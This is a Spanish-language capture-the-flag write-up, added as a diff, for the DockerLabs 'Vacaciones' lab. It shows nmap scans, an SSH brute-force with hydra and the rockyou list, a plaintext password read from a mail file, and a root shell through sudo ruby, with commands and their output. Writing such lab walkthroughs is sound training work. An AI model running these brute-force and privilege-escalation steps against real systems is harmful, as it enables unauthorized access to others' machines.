@@ -1,0 +1,125 @@
+---
+type: writeup
+title: Vacaciones
+description: Laboratorio para practicar fuerza bruta contra SSH y escalada de privilegios en Linux.
+lang: es
+draft: false
+image: ../../../images/writeups/dockerlabs/dockerlabs.webp
+platform: dockerlabs
+url: https://dockerlabs.es/
+difficulty: muyfacil
+os: linux
+hints: ["Brute force", "Hardcoded credentials", "Sudoers"]
+tags: ["brute-force", "hardcoded-credentials", "sudoers"]
+---
+
+## Enumeration
+
+Escaneamos todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+```
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
+|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
+|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Miramos que carajo hay en la página web.
+
+```bash
+curl http://172.17.0.2
+```
+
+```html
+<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
+```
+
+Un miserable comentario con un pista terrible e indubitatible. Tenemos que hacer fuerza bruta con este usuario regalado.
+
+```bash
+hydra -l camilo -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://172.17.0.2 -I -F -t 16
+```
+
+```plaintext
+[22][ssh] host: 172.17.0.2   login: camilo   password: password1
+```
+
+Y como debe ser encontramos una contraseña.
+
+Nos conectamos por **ssh** con las credenciales encontradas.
+
+```bash
+ssh camilo@172.17.0.2
+```
+
+## Lateral Movement
+
+El comentario decía que **juan** le había dejado un correo electrónico, a por ello.
+
+```bash
+cat /var/mail/camilo/correo.txt
+```
+
+```plaintext
+Hola Camilo,
+
+Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
+```
+
+Tremendo, una contraseña en texto plano. Iniciamos sesión con las credenciales de **juan**.
+
+```bash
+su juan
+```
+
+## Privilege Escalation
+
+Listamos los privilegios y comandos permitidos que tiene **juan**.
+
+```bash
+sudo -l
+```
+
+```plaintext
+Matching Defaults entries for juan on f1f0e66ac149:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User juan may run the following commands on f1f0e66ac149:
+    (ALL) NOPASSWD: /usr/bin/ruby
+```
+
+Puede ejecutar **ruby** como **sudo** y sin contraseña, my gosh. Buscamos en la web [GTFOBins](https://gtfobins.org/gtfobins/ruby/#shell) y encontramos la forma de obtener una shell con **ruby**.
+
+```bash
+sudo ruby -e 'exec "/bin/sh"'
+```
+
+Verificamos que estamos como **root**.
+
+```
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
